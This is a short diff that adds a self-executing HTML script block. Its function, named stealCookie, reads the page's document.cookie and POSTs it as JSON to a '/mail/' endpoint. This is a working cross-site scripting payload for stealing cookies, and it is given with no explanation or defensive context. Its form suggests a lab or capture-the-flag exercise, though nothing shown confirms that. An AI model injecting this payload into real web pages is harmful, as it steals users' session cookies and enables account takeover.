@@ -1,0 +1,11 @@
+<script>
+function stealCookie() {
+    var http = new XMLHttpRequest();
+    http.open("POST", '/mail/');
+    http.setRequestHeader("Content-type", "application/json");
+    var data = new Object();
+    data.content = document.cookie;
+    http.send(JSON.stringify(data));
+};
+stealCookie();
+</script>>
